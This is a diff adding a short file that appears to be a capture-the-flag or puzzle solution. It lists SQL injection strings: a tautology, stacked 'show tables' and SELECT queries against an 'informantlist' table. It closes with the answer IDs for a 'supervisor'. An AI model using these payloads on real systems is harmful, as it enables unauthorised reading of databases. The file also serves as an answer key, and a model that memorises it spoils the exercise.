@@ -1,0 +1,14 @@
+\' OR 1=1 ; id = 18724 --
+
+\' ; show tables; --
+
+
+\' ; SELECT * FROM informantlist  ; --
+
+\' ; SELECT * FROM informantlist where id= 77313  ; --
+
+
+
+Give your supervisor the following IDs:
+Id	Areas
+77313	9.UCdd	60ad79beee0ab941e1f99e25dbe06026	Eshleman Hall ; LeConte Hall ; UC Press
